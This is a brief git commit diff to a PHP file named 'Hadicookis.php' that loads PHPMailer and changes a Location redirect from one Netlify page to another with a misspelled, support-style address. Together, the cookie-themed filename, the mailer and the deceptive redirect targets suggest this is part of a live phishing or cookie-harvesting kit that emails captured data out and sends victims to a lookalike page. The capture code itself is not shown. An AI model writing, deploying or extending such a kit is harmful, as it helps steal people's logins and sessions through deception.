9c36b5f16067cf4a69a1b285a65ac9065f7e68e9
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-09 12:02:08 +0500

    Update Hadicookis.php

--- Hadicookis.php
+++ Hadicookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://page-help-data-info.netlify.app/");
+header("Location: https://page-quulaaty-now-submit.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
